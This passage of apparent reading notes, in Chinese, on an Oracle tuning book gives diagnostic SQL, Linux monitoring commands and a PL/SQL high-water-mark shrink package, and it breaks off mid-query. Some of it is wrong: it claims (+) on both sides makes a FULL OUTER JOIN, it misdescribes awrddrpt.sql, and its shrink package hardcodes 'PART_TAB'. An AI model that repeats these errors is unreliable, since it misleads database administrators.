操作ANALYZE 操作用于收集表和索引的统计信息，这些信息用于优化器制定执行计划。通过定期执行 ANALYZE，可以确保优化器拥有最新的统计数据，从而选择最优的查询执行计划。\n-- 分析表ANALYZE TABLE mytable COMPUTE STATISTICS;-- 分析索引ANALYZE INDEX myindex COMPUTE STATISTICS;\n\nOPTIMIZE 操作OPTIMIZE 操作用于重新组织索引，减少碎片并提高索引的效率。对于 B 树索引，OPTIMIZE 操作会压缩索引，减少索引占用的空间并提高查询性能。\n-- 优化索引ALTER INDEX myindex REBUILD;\n\n注意事项\n性能影响：执行 ANALYZE 和 OPTIMIZE 操作可能会对数据库性能产生影响，尤其是在大型表和索引上。因此，通常建议在非高峰时段执行这些操作。\n\n资源消耗：这些操作可能会消耗较多的 CPU 和 I&#x2F;O 资源。在执行之前，请确保有足够的资源可用。\n\n备份：在执行 REBUILD 操作之前，建议先备份索引，以防万一出现问题。\n\n定期执行：根据表的使用频率和数据变化情况，定期执行 ANALYZE 和 OPTIMIZE 操作。\n\n数据大量更新后：在对表进行了大量插入、删除或更新操作后，执行 ANALYZE 和 OPTIMIZE 可以帮助减少数据碎片化并更新统计信息。\n\n\n也可以使用 DBMS_STATS 包查看和修改为数据库对象收集的优化器统计信息。Oracle 官方文档 DBMS_STATS\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记下篇","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8B%E7%AF%87/","content":"下篇的章节，主要是作者多年优化工作中的经验总结。主要是关于解决问题的思路，如何定位问题等。技术相关的其实不多。我也觉得会发现问题比会解决问题的人更厉害。这几章经典的优化操作，主要的思想就是以下这些。（我读完的总结，不一定全。）\n\n少做事，在可以满足需求的情况下，尽量不做无意义的事。毕竟再怎么优化也没有不做快。比如，排序是否需要，一定要的情况下是否可以走索引，所以是有序的，可以避免排序。\n提问的方式，描述问题要准确、有重点。避免太过简单或者太过复杂。另外，不要问以前问过的问题，勤用搜索引擎和动手实践独立解决问题。\n规范，学习、操作、流程、开发、设计等等方面都需要有规范，规范可以提高效率避免出错。\n\n下面是一些命令，用于排查问题等。\n流程规范 保障问题快速解决动态整体主机动态情况检查\n# 主机情况检查（数据库出问题，主机是首先要查看的，皮之不存，毛将焉附）uname -a# 检查主机CPU等使用情况（重点关注时间最长的，同时也注意观察主机的内存的物理大小和CPU的个数)top # 报告虚拟内存统计信息以及其他与系统活动相关的信息 1 10 表示每秒输出一次统计信息，一共输出10次vmstat 1 10# 统计所有包含 &quot;ora&quot; 的进程数。ps -ef |grep ora |wc -l# 统计所有既包含 &quot;ora&quot; 又包含 &quot;LOCAL&quot; 的进程数，这通常指本地监听器和数据库实例的进程。ps -ef |grep ora |grep LOCAL |wc -l\n\nvmstat 命令输出结果含义：\n\nprocs:\nr: 当前运行和可运行（等待运行）的进程数。\nb: 处于不可中断睡眠状态的进程数。\n\n\nmemory:\nswpd: 使用的虚拟内存交换空间大小（KB）。\nfree: 空闲物理内存大小（KB）。\nbuff: 用作缓冲区的物理内存大小（KB）。\ncache: 用作缓存的物理内存大小（KB）。\n\n\nswap:\nsi: 每秒从磁盘交换到内存的大小（KB&#x2F;s）。\nso: 每秒从内存交换到磁盘的大小（KB&#x2F;s）。\n\n\nio:\nbi: 每秒从块设备读取的数据量（KB&#x2F;s）。\nbo: 每秒写入块设备的数据量（KB&#x2F;s）。\n\n\nsystem:\nin: 每秒发生的中断次数。\ncs: 每秒上下文切换次数。\n\n\ncpu:\nus: 用户空间占用的 CPU 百分比。\nsy: 内核空间占用的 CPU 百分比。\nid: 空闲 CPU 百分比。\nwa: 等待 I&#x2F;O 完成的 CPU 百分比。\nst: 被窃取的时间百分比（仅在虚拟化环境中可见）。\n\n\n\n输出示例：\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st 2  0      0 115444   6688 1897744    0    0   261    30    3    4  2  3 94  1  0 0  0      0 114500   6688 1897792    0    0     0    32 1949 3657  3  3 94  0  0 0  0      0 114648   6688 1897792    0    0     0     0 1642 2953  1  2 97  0  0 0  0      0 114512   6688 1897792    0    0     0     0 2037 3806  3  3 94  0  0 0  0      0 114512   6700 1897796    0    0    16    84 2148 3758  3  4 93  0  0 0  0      0 114512   6700 1897808    0    0     0     0 2152 4052  3  4 94  0  0 0  0      0 114512   6700 1897808    0    0     0     0 1784 3357  1  2 98  0  0 0  0      0 115272   6724 1897812    0    0     0   160 2202 4116  3  4 93  0  0 0  0      0 116028   6756 1897812    0    0     0   324 1835 3365  2  2 95  1  0 0  0      0 116916   6756 1897812    0    0     0     0 2011 3854  2  4 95  0  0\n\n\n性能视图备份\n-- 考虑备份数据库性能视图（最好是在新建的非生产使用的单独用户下操作，比如 TEST_USER 用户）-- 此外在数据库需要重启时，更应考虑备份这些视图create table diag_session_&amp;yyyymmdd_seq_area nologging asselect *from gv$session;create table diag_session_wait_&amp;yyyymmdd_seq_area nologging asselect *from gv$session_wait;create table diag_process_&amp;yyyymmdd_seq_area nologging asselect *from gv$process;create table diag_sql_&amp;yyyymmdd_seq_area nologging asselect *from gv$sql;create table diag_sqlarea_&amp;yyyymmdd_seq_area nologging asselect *from gv$sqlarea;create table diag_sql_plan_&amp;yyyymmdd_seq_area nologging asselect *from gv$sql_plan; --耗性能create table diag_lock_&amp;yyyymmdd_seq_area nologging asselect *from gv$lock;create table diag_locked_object_&amp;yyyymmdd_seq_area nologging asselect *from gv$locked_object;create table diag_access_&amp;yyyymmdd_seq_area nologging asselect *from gv$access;create table diag_latch_&amp;yyyymmdd_seq_area nologging asselect *from gv$latch;create table diag_latch_children_&amp;yyyymmdd_seq_area nologging asselect *from gv$latch_children;create table diag_Librarycache_&amp;yyyymmdd_seq_area nologging asselect *from gv_$Librarycache;create table diag_rowcache_&amp;yyyymmdd_seq_area nologging asselect *from gv_$rowcache;create table diag_sort_segment_&amp;yyyymmdd_seq_area nologging asselect *from gv$sort_segment;create table diag_sort_usage_&amp;yyyymmdd_seq_area nologging asselect *from gv$sort_usage;create table diag_log_history_&amp;yyyymmdd_seq_area nologging asselect *from gv$log_history;create table diag_log_&amp;yyyymmdd_seq_area nologging asselect *from gv$log;create table diag_logfile_&amp;yyyymmdd_seq_area nologging asselect *from gv$logfile;create table diag_transaction_&amp;yyyymmdd_seq_area nologging asselect *from gv$transaction;create table diag_parameter_&amp;yyyymmdd_seq_area nologging asselect *from gv$parameter;create table diag_session_longops_&amp;yyyymmdd_seq_area nologging asselect *from gv$session_longops;create table diag_bh_&amp;yyyymmdd_seq_area nologging asselect *from gv$bh;create table diag_filestat_&amp;yyyymmdd_seq_area nologging asselect *from gv$filestat;create table diag_segstat_&amp;yyyymmdd_seq_area nologging asselect *from gv$segstat;create table diag_tempstat_&amp;yyyymmdd_seq_area nologging asselect *from gv$tempstat;create table diag_datafile_&amp;yyyymmdd_seq_area nologging asselect *from gv$datafile;create table diag_tempfile_&amp;yyyymmdd_seq_area nologging asselect *from gv$tempfile;create table diag_open_cursors_&amp;yyyymmdd_seq_area nologging asselect *from gv$open_cursors;\n\n\n获取基线当系统觉得有问题时，可以考虑立即取一个断点基线，作为AWR报表的一个断点。exec dbms_workload_repository.create_snapshot();\n\n观察临时表空间和回滚段表空间情况\n-- 查谁占用了undo表空间select r.name                      回滚段名     , rssize / 1024 / 1024 / 1024 &quot;rssize(g)&quot;     , s.sid     , s.serial#     , s.username                  用户名     , s.status     , s.sql_hash_value     , s.sql_address     , s.machine     , s.module     , substr(s.program, 1, 78)    操作程序     , r.usn     , hwmsize / 1024 / 1024 / 1024     , shrinks     , xactsfrom sys.v_$session S   , sys.v_$transaction t   , sys.v_$rollname r   , v$rollstat rswhere t.addr = s.taddr  and t.xidusn = r.usn  and r.usn = rs.usnorder by rssize desc;-- 查谁占用了temp表空间select t.blocks * 16 / 1024 / 1024     , s.username     , s.schemaname     , t.tablespace     , t.segtype     , t.extents     , s.program     , s.osuser     , s.terminal     , s.sid     , s.serial#from v$sort_usage t   , v$session swhere t.session_addr = s.saddr;-- 还可查到具体SQLselect sql.sql_id     , t.blocks * 16 / 1024 / 1024     , s.username     , s.schemaname     , t.tablespace     , t.segtype     , t.extents     , s.program     , s.osuser     , s.terminal     , s.sid     , s.serial#     , sql.sql_textfrom v$sort_usage t   , v$session s   , v$sql sqlwhere t.session_addr = s.saddr  and t.sqladdr = sql.address  and t.sqlhash = sql.hash_value;\n\n动态局部通过主机进程PID查SQL通过主机进程PID查SQL(这个步骤和之前的top命令紧密相连，就是为了直接分析这些耗CPU的进程和哪些SQL有关系)本来可以用如下方法来查，但是系统出现问题时，一般不容易查出来，太慢（有时用 ordered 或者 no_merge 的 HINT 有效，有时无效)\nselect /*+ ordered */    sql_textfrom v$sqltext awhere (a.hash_value, a.address) in      (select decode(sql_hash_value, 0, prev_hash_value, sql_hash_value)            , decode(sql_hash_value, 0, prev_sql_addr, sql_address)       from v$session b       where b.paddr =             (select addr from v$process c where c.spid = &#x27;&amp;pid&#x27;))order by piece asc;\n\n一般采用下面三步（可避免性能问题，返回结果会快）\n-- 1. 获取 addrselect spid     , addr     , t.pga_used_mem     , t.pga_alloc_mem     , t.pga_freeable_mem     , t.pga_max_memfrom v$process twhere spid = &#x27;$pid&#x27;;-- 2. 根据 addr 获取 sql_idselect t.sid     , t.program     , t.machine     , t.logon_time     , t.wait_class     , t.wait_time     , t.seconds_in_wait     , t.event     , t.sql_id     , t.prev_sql_idfrom v$session twhere paddr = &#x27;$addr&#x27;;-- 3. 根据 sql_id 查询具体 SQLselect t.sql_id     , t.sql_text     , t.executions     , t.first_load_time     , t.last_load_time     , t.buffer_gets     , t.rows_processedfrom v$sql twhere sql_id in (&#x27;$sql_id&#x27;);\n\n\n观察当前数据库的版本及等待情况，SQL基本情况。\n-- 等待事件（当前)select t.event, count(*)from v$session tgroup by eventorder by count(*) desc;-- 等待事件（历史汇集）select t.event, t.total_waitsfrom v$system_event torder by total_waits desc;-- 游标使用情况select inst_id, sid, count(*)from gv$open_cursorgroup by inst_id, sidhaving count(*) &gt;= 1000order by count(*) desc;-- PGA占用最多的进程select p.spid     , p.pid     , s.sid     , s.serial#     , s.status     , p.pga_alloc_mem     , s.username     , s.osuser     , s.programfrom v$process p   , v$session swhere s.paddr(+) = p.addrorder by p.pga_alloc_mem desc;-- 登录时间最长的SESSION(同时获取到 spid ,方便在主机层面 ps-ef|grep spid 来查看)select *from (select t.sid           , t2.spid           , t.PROGRAM           , t.status           , t.sql_id           , t.PREV_SQL_ID           , t.event           , t.LOGON_TIME           , trunc(sysdate - logon_time)      from v$session t         , v$process t2      where t.paddr = t2.ADDR        and t.type &lt;&gt; &#x27;BACKGROUND&#x27;      order by logon_time)where rownum &lt; 20;-- 物理读和逻辑较多的5QL-- 逻辑读最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets      from v$sql s      where s.buffer_gets &gt; 300      order by buffer_gets desc)where rownum &lt;= 20;-- 物理读最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets           , s.parse_calls      from v$sql s      where s.disk_reads &gt; 300      order by disk_reads desc)where rownum &lt;= 20;-- 执行次数最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets           , s.parse_calls      from v$sql s      order by s.executions desc)where rownum &lt;= 20;-- 解析次数最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets           , s.parse_calls      from v$sql s      order by s.parse_calls desc)where rownum &lt; 20;-- 求 DISK SORT 严重的 SQLselect sess.username, sql.sql_text, sql.address, sort1.blocksfrom v$session sess   , v$sqlarea sql   , v$sort_usage sort1where sess.serial# = sort1.session_num  and sort1.sqladdr = sql.address  and sort1.sqlhash = sql.hash_value  and sort1.blocks &gt; 200order by sort1.blocks desc;\n\n补充：在 Oracle SQL 中，(+) 符号用于指示外连接（outer join）。除了 (+) 符号之外，Oracle 还支持使用 LEFT OUTER JOIN,RIGHT OUTER JOIN, 和 FULL OUTER JOIN 语法来表达外连接。\nJOIN 的写法这里就省略了。下面说 (+) 的写法：\n\n(+) 符号用于指示外连接，它可以出现在等式的一边或两边。\n如果 (+) 出现在等式的左边，则表示 LEFT OUTER JOIN。\n如果 (+) 出现在等式的右边，则表示 RIGHT OUTER JOIN。\n如果 (+) 出现在等式的两边，则表示 FULL OUTER JOIN。\n\n语法:\nFROM left_table, right_tableWHERE left_table.column (+) = right_table.column\n\n\n语法差异:\n\n使用 LEFT OUTER JOIN, RIGHT OUTER JOIN, 和 FULL OUTER JOIN 语法时，可以使用现代的 ANSI SQL 标准语法。\n使用 (+) 符号时，需要使用旧式的逗号连接语法，并在 WHERE 子句中指定外连接条件。\n\n\n性能:\n\n在大多数情况下，使用现代的外连接语法 (LEFT OUTER JOIN, RIGHT OUTER JOIN, 和 FULL OUTER JOIN) 可能会产生更好的执行计划和性能。\n(+) 符号虽然仍然支持，但在新版本的 Oracle 数据库中可能不再推荐使用。\n\n\n版本兼容性:\n\n确保使用的外连接语法在当前 Oracle 数据库版本中可用。\n\n\n\n\n检查是否有过分提交的语句检查是否有过分提交的语句，关键是得到 sid,代入 V$SESSION 就可知道是什么进程，接下来还可以知道 V$SQL\n-- 提交次数最多的SESSIONselect t1.sid, t1.value, t2.namefrom v$sesstat t1   , v$statname t2--where t2.name like &#x27;%commit%&#x27;where t2.name like &#x27;%user commits?%&#x27; -- 可以只选user commits,其他系统级的先不关心  and t1.STATISTIC# = t2.STATISTIC#  and value &gt;= 10000order by value desc;-- 取得SID既可以代入到v$SESSION和v$SQL中去分析-- 得出SQL_IDselect t.sid     , t.program     , t.machine     , t.logon_time     , t.wait_class     , t.wait_time     , t.seconds_in_wait     , t.event     , t.sql_id     , t.prev_sql_idfrom v$session twhere sid in (&#x27;$sid&#x27;);-- 根据sql id或prev_sql_id代入得到SQLselect t.sql_id     , t.sql_text     , t.executions     , t.first_load_time     , t.last_load_time     , t.buffer_gets     , t.rows_processedfrom v$sql twhere sql_id in (&#x27;$sql_id&#x27;)\n\n\n检查系统使用绑定变量的情况\n-- 查询共享内存占有率select count(*), round(sum(sharable_mem) / 1024 / 1024, 2)from v$db_object_cache a;-- 捕获出需要使用绑定变量的SQL(这里只能适配大多数语句)Drop table t1 purge;create table t1 asselect sql_text, modulefrom v$sqlarea;alter table t1    add sql_text_wo_constants varchar2(1000);CREATE OR REPLACE FUNCTION remove_constants(p_query IN VARCHAR2) RETURN VARCHAR2AS    l_query     LONG;    l_char      VARCHAR2(10);    l_in_quotes BOOLEAN DEFAULT FALSE;BEGIN    FOR i IN 1..LENGTH(p_query)        LOOP            l_char := SUBSTR(p_query, i, 1);            IF (l_char = &#x27;&#x27;&#x27;&#x27;) THEN                IF l_in_quotes THEN                    l_in_quotes := FALSE;                ELSE                    l_in_quotes := TRUE;                    l_query := l_query || &#x27;&#x27;&#x27;#&#x27;;                END IF;            ELSIF NOT l_in_quotes THEN                l_query := l_query || l_char;            END IF;        END LOOP;    -- 替换数字    l_query := TRANSLATE(l_query, &#x27;0123456789&#x27;, &#x27;@@@@@@@@@@&#x27;);    -- 移除多余的 @ 符号    FOR i IN 0..8        LOOP            l_query := REPLACE(l_query, LPAD(&#x27;@&#x27;, 10 - i, &#x27;@&#x27;), &#x27;@&#x27;);            l_query := REPLACE(l_query, LPAD(&#x27;&#x27;, 10 - i, &#x27;&#x27;), &#x27;&#x27;);        END LOOP;    RETURN UPPER(l_query);END;-- 编译函数    ALTER FUNCTION TEST_USER.remove_constants COMPILE;update TEST_USER.t1set sql_text_wo_constants = remove_constants(sql_text);commit;-- 执行完上述动作后，以下SQL语句可以完成未绑定变量语句的统计select sql_text_wo_constants, module, count(*)from t1group by sql_text_wo_constants, modulehaving count(*) &gt; 100order by 3 desc;\n\n静态整体主机静态情况检查\n# 查看磁盘空间使用情况df -h# 主机内存情况cat /proc/meminfo# 主机CPU情况cat /proc/cpuinfo\n\n\n记录下Oracle数据库的所有参数设置情况，并检查是否归档\n-- 版本及所有参数情况-- 开启CRT的日志跟踪-- 版本select *from v$version;-- 所有参数show parameter-- 关闭CRT的日志跟踪，将文件取回-- 其中重点关注的是-- sga pga log_buffer processes open_cursors session_cached_cursors db_recovery_file_dest cluster_database-- SGA, PGA, 日志缓冲区, 进程数, 打开的游标数, 会话缓存的游标数, 数据库恢复文件目的地, 集群数据库设置相关的参数。-- 是否归档archive log list\n\n\n检查数据库表和索引是否存在并行度设在其中的情况\n-- 检查数据库表和索引是否存在并行度设在其中的情况（很多时候有人用parallel建了表或索引，忘记alter table xxx noparallel关闭了)。select t.owner, t.table_name, degreefrom dba_tables twhere t.degree &gt; &#x27;1&#x27;;select t.owner, t.table_name, index_name, degree, statusfrom dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;-- 有问题就要处理，比如索引有并行，就处理如下：select &#x27;alter index &#x27; || t.owner || &#x27;.&#x27; || index_name || &#x27;noparallel;&#x27;from dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;\n\n\n检查是否有失效的索引\n-- 普通索引select t.index_name     , t.table_name     , blevel     , t.num_rows     , t.leaf_blocks     , t.distinct_keysfrom dba_indexes twhere status = &#x27;INVALID&#x27;;-- 分区索引select t2.owner     , t1.blevel     , t1.leaf_blocks     , t1.index_name     , t2.table_name     , t1.partition_name     , t1.statusfrom dba_ind_partitions t1   , dba_indexes t2where t1.index_name = t2.index_name  and t1.status = &#x27;UNUSABLE&#x27;  and t2.owner in (&#x27;TEST_USER&#x27;);-- 以下是所有失效对象的检查select &#x27;alter&#x27; ||       decode(object_type, &#x27;PACKAGE BODY&#x27;, &#x27;PACKAGE&#x27;, &#x27;TYPE BODY&#x27;, &#x27;TYPE&#x27;, object_type) || &#x27;&#x27; ||       owner || &#x27;.&#x27; || object_name || &#x27;&#x27; ||       decode(object_type, &#x27;PACKAGE BODY&#x27;, &#x27;compile body&#x27;, &#x27;compile&#x27;) || &#x27;;&#x27;     , t.*from dba_objects twhere status = &#x27;INVALID&#x27;--owner not in (&#x27;PUBLIC&#x27;,&#x27;SYSTEM&#x27;,&#x27;SYS&#x27;)  and owner in (&#x27;TEST_USER&#x27;);\n\n\n检查是否有显著未释放高水平位的表\nselect table_name, blocks, num_rowsfrom user_tableswhere blocks / num_rows &gt;= 0.2  and num_rows is not null  and num_rows &lt;&gt; 0  and blocks &gt;= 10000;-- 这个就可以预测到哪些是高水平位没释放的表。-- 其中blocks&gt;:=10000是因为低于10000的块说明表的体积太小了，释放或不释放无所谓。-- 而 blocks / num_rows &gt;= 1 表示是严重有问题的。-- 而这个 blocks / num_rows &gt;= 0.2 表示至少一个块要装5行数据，如果装不了，那就很奇怪了，值得怀疑了，除非有LONG和CLOB字段或者一堆的VARCHAR2(4OOO)字段。-- 附（可以释放高水平位的脚本，在 Oracle 的 shrink 方法无效时可采纳）：create or replace package pkg_shrink    Authid Current_Useras    /*    功能：将delete后的表降低高水平    */    procedure p_move_tab(p_tab varchar2);    procedure p_cal_bytes(p_status varchar2, p_tab varchar2);    procedure p_rebuid_idx(p_tab varchar2);    procedure p_main(p_table_name varchar2);end pkg_shrink;create or replace package body pkg_shrinkas    v_sql varchar2(4000);    procedure p_cal_bytes(p_status varchar2, p_tab varchar2)    as        v_tab_bytes number;        v_idx_bytes number;        v_str_tab   varchar2(4000);        v_str_idx   varchar2(4000);    begin        select sum(bytes) / 1024 / 1024 into v_tab_bytes from user_segments where segment_name = upper(p_tab);        select sum(bytes) / 1024 / 1024        into v_idx_bytes        from user_segments        where segment_name IN (SELECT INDEX_NAME                               FROM USER_INDEXES                               WHERE TABLE_NAME = upper(p_tab));        v_str_tab := p_status || &#x27;表&#x27; || p_tab || &#x27;的大小为&#x27; || v_tab_bytes || &#x27;M&#x27;;        if v_idx_bytes is null then            v_str_idx := p_status || &#x27;无索引&#x27;;        else            v_str_idx := p_status || &#x27;索引的大小为&#x27; || v_idx_bytes || &#x27;M&#x27;;        end if;        dbms_output.put_line(v_str_tab || &#x27;;&#x27; || v_str_idx);    end p_cal_bytes;    procedure p_move_tab(p_tab varchar2)    as        V_IF_PART_TAB NUMBER;    begin        SELECT COUNT(*) INTO V_IF_PART_TAB FROM user_part_tables WHERE TABLE_NAME = upper(P_TAB);        IF V_IF_PART_TAB = 0 THEN --非分区表            v_sql := &#x27;alter table &#x27; || p_tab || &#x27; move&#x27;; -- 完成表的MOVE动作，从而做到降低高水平位，不过也带来了索引的失效！            DBMS_OUTPUT.put_line(v_sql);            execute immediate v_sql;        ELSE -- 分区表            for i in (SELECT * from USER_TAB_PARTITIONS WHERE TABLE_NAME = upper(p_tab))                loop                    v_sql := &#x27;alter table &#x27; || p_tab || &#x27; move partition &#x27; || i.partition_name; -- 完成分区表的MOVE动作，同样带来了索引失效！                    DBMS_OUTPUT.put_line(v_sql);                    execute immediate v_Sql;                end loop;        END IF;    end p_move_tab;    procedure p_rebuid_idx(p_tab varchar2)    as        V_NORMAL_IDX NUMBER;        V_PART_IDX   NUMBER;    begin        SELECT COUNT(*)        INTO V_NORMAL_IDX        FROM user_indexes        where table_name = &#x27;PART_TAB&#x27;          AND INDEX_NAME            NOT IN (SELECT INDEX_NAME FROM user_part_indexes);        IF V_NORMAL_IDX &gt;= 1 THEN -- 普通索引            for i in (select *                      from user_indexes                      where table_name = upper(p_tab)                        AND INDEX_NAME                          NOT IN (SELECT INDEX_NAME FROM user_part_indexes))                loop                    v_sql := &#x27;alter index &#x27; || i.index_name || &#x27; rebuild&#x27;; -- 将失效的普通索引重建                    DBMS_OUTPUT.put_line(v_sql);                    execute immediate v_sql;                end loop;        END IF;        SELECT COUNT(*) INTO V_PART_IDX FROM user_part_indexes WHERE TABLE_NAME = &#x27;PART_TAB&#x27;;        IF V_PART_IDX &gt;= 1 THEN -- 分区索引            for i in (SELECT *                      from User_Ind_Partitions                      WHERE index_name in (select index_name                                           from user_part_indexes                                           where table_name = upper(p_tab)))                loop                    v_sql := &#x27;alter index &#x27; || i.index_name || &#x27; rebuild partition &#x27; || i.partition_name; -- 将失效分区索引重建                    DBMS_OUTPUT.put_line(v_sql);                    execute immediate v_Sql;                end loop;        END IF;    end p_rebuid_idx;    procedure p_main(p_table_name varchar2)    as    begin        for i in (select *                  from (SELECT SUBSTR(s, INSTR(s, &#x27;,&#x27;, 1, ROWNUM) + 1,                                      INSTR(s, &#x27;,&#x27;, 1, ROWNUM + 1) - INSTR(s, &#x27;,&#x27;, 1, ROWNUM) - 1) AS TYPE_ID                        FROM (SELECT &#x27;,&#x27; || p_table_name || &#x27;,&#x27; AS s FROM DUAL)                        CONNECT BY ROWNUM &lt;= 100)                  WHERE type_id IS NOT NULL            )            loop                -- 在外面SELECT再套一层是必须的，否则只会循环一次。另外type_id IS NOT NULL是必须的，否则会多循环                DBMS_OUTPUT.put_line(&#x27;当前处理的表为&#x27; || i.TYPE_ID);                p_cal_bytes(&#x27;未降低高水平位前&#x27;, i.type_id);                p_move_tab(i.type_id);                p_rebuid_idx(I.TYPE_ID);                p_cal_bytes(&#x27;降低高水平位后&#x27;, i.type_id);            end loop;    end p_main;end pkg_shrink;-- 编译    alter package PKG_SHRINK compile reuse settings-- 执行BEGIN    pkg_shrink.p_main(&#x27;TABLE_NAME&#x27;);END;\n\n\n检查统计信息\n自动统计信息收集情况\n-- 检查哪些对象的统计信息不够新，或者从未统计过（注意，让未统计过的在前面，即nulls first)。-- 检查统计信息是否被收集select t.JOB_NAME, t.PROGRAM_NAME, t.state, t.enabledfrom dba_scheduler_jobs twhere job_name = &#x27;GATHER_STATS_JOB&#x27;;-- 检查哪些未被收集或者很久没收集select owner     , table_name     , t.last_analyzed     , t.num_rows     , t.blocks     , t.object_typefrom dba_tab_statistics twhere owner in (&#x27;TEST_USER&#x27;)  and (t.last_analyzed is null or t.last_analyzed &lt; sysdate - 14)order by t.last_analyzed nulls first;-- 查看数量select count(*)from dba_tab_statistics twhere owner in (&#x27;TEST_USER&#x27;)  and (t.last_analyzed is null or t.last_analyzed &lt; sysdate - 14);\n\n全局临时表情况\n-- 检查全局临时表有没有被收集统计信息select owner     , table_name     , t.last_analyzed     , t.num_rows     , t.blocksfrom dba_tables twhere t.temporary = &#x27;Y&#x27;  and owner in (&#x27;TEST_USER&#x27;);-- 相应的处理措施BEGIN    DBMS_STATS.DELETE_TABLE_STATS(&#x27;TEST_USER&#x27;, &#x27;RN_IDENTIFICATION_BATCH&#x27;); -- 删除统计信息    DBMS_STATS.LOCK_TABLE_STATS(&#x27;TEST_USER&#x27;, &#x27;RN_IDENTIFICATION_BATCH&#x27;); -- 不收集统计信息END;\n\n\nawr addm ash awrddrpt awrsqrpt等方式观察数据库\nexec dbms_workload_repository.create_snapshot();@?/rdbms/admin/awrrpt.sql@?/rdbms/admin/addmrpt.sql@7/rdbms/admin/ashrpt.sql@?/rdbms/admin/awrddrpt.sql@?/rdbms/admin/awrsqrpt.sql-- 注意：一般要考虑统计出问题的时间段的报表，顺序一般是 awr -&gt; addm -&gt; ash -&gt; awrdd -&gt; awrsq\n\n这些命令和脚本用于生成和分析 Oracle 自动工作负载仓库 (AWR) 的报告。\n\nexec dbms_workload_repository.create_snapshot();:\n该命令用于创建一个新的 AWR 快照。AWR 快照包含了数据库在某一时间段内的性能统计数据，这些数据可用于后续的性能分析。\n创建快照有助于记录当前数据库的工作负载状况，并为后续的性能对比提供基准。\n\n\n@?/rdbms/admin/awrrpt.sql:\n此命令用于执行 AWR 报告生成脚本 awrrpt.sql。该脚本会生成一份详细的 AWR 报告，这份报告包含了数据库在指定时间段内的性能指标和统计数据。\nAWR 报告是性能分析的基础，可以了解数据库的整体性能状况。\n\n\n@?/rdbms/admin/addmrpt.sql:\n此命令用于执行 ADDM (自动数据库诊断监控器) 报告生成脚本 addmrpt.sql。该脚本会生成一份基于 AWR 数据的 ADDM 报告。\nADDM 报告提供了更深入的性能分析，包括性能问题的根本原因分析和优化建议。\n\n\n@7/rdbms/admin/ashrpt.sql:\n此命令用于执行 ASH (自动共享历史) 报告生成脚本 ashrpt.sql。该脚本会生成一份基于 ASH 数据的报告。\nASH 报告提供了关于会话活动的详细信息，包括等待事件、SQL 执行等，这对于诊断性能瓶颈非常有用。\n\n\n@?/rdbms/admin/awrddrpt.sql:\n此命令用于执行 AWR 数据字典报告生成脚本 awrddrpt.sql。该脚本会生成一份关于 AWR 数据字典的报告。\nAWR 数据字典报告提供了关于 AWR 表的详细信息，这有助于理解 AWR 数据的结构。\n\n\n@?/rdbms/admin/awrsqrpt.sql:\n此命令用于执行 AWR SQL 报告生成脚本 awrsqrpt.sql。该脚本会生成一份关于 SQL 语句执行性能的报告。\nAWR SQL 报告提供了 SQL 语句的性能统计数据，包括执行次数、CPU 时间等，这对于优化 SQL 语句的性能非常有用。\n\n\n\n\n获取数据库告警和监听日志\nlsnrctl status # 可获取监听的路径\n\nshow parameter ump -- 可获取告警日志的路径-- 文件很大的情况下，可以考虑 tail -n 50000 alert* &gt; alert.log 的方式获取最近5万条记录-- 监听也是类似 tail -n 50000 list* &gt; listener.log\n\n\n检查日志大小设置情况\n-- 一般情况下，建议单个RED0设置为5GB大，如果发现告警日志切换频繁，则应该立即调整select inst_id, group#, memberfrom gv$logfile;select group#, bytes, statusfrom v$log;\n\n\n检查最大的对象是哪些、表空间的使用情况及回收站情况\n-- 用户的权限情况select *from dba_role_privswhere grantee = &#x27;TEST_USER&#x27;;-- 最大的前20个对象（然后再进一步COUNT(*)统计其记录数）select *from (select owner           , segment_name           , segment_type           , sum(bytes) / 1024 / 1024 / 1024 object_size      from DBA_segments      WHERE owner in (&#x27;TEST_USER&#x27;)      group by owner, segment_name, segment_type      order by object_size desc)where rownum &lt; 50;-- 表空间使用情况select a.tablespace_name                                    &quot;表空间名&quot;     , a.total_space                                        &quot;总空间(g)&quot;     , nvl(b.free_space, 0)                                 &quot;剩余空间(g)&quot;     , a.total_space - nvl(b.free_space, 0)                 &quot;使用空间(g)&quot;     , trunc(nvl(b.free_space, 0) / a.total_space * 100, 2) &quot;剩余百分比%&quot;from (select tablespace_name           , trunc(sum(bytes) / 1024 / 1024 / 1024, 2) total_space      from dba_data_files      group by tablespace_name) a   , (select tablespace_name           , trunc(sum(bytes / 1024 / 1024 / 1024), 2) free_space      from dba_free_space      group by tablespace_name) bwhere a.tablespace_name = b.tablespace_name(+)order by 5;-- 整个用户有多大（比如 TEST_USER 用户）select sum(bytes) / 1024 / 1024 / 1024 &quot;G&quot;from dba_segmentswhere owner = &#x27;TEST_USER&#x27;;-- 回收站情况select SUM(BYTES) / 1024 / 1024 / 1024from DBA_SEGMENTSWHERE owner = &#x27;TEST_USER&#x27;  AND SEGMENT_NAME LIKE &#x27;BINS%&#x27;;-- 分区最多的前20个对象（先知道表就可以大概了解了，索引可以后续再观察）select *from (select table_owner, table_name, count(*) cnt      from dba_tab_partitions      WHERE table_owner in (&#x27;TEST_USER&#x27;)      group by table_owner, table_name      order by cnt desc)where rownum &lt; 20;\n\n静态局部检查有哪些函数索引或者位图索引\n-- 检查有哪些函数索引或者位图索引（大多数情况下开发人员对这两类索引是使用不当的，所以需要捞出来确认一下)select t.owner     , t.index_name     , t.index_type     , t.status     , 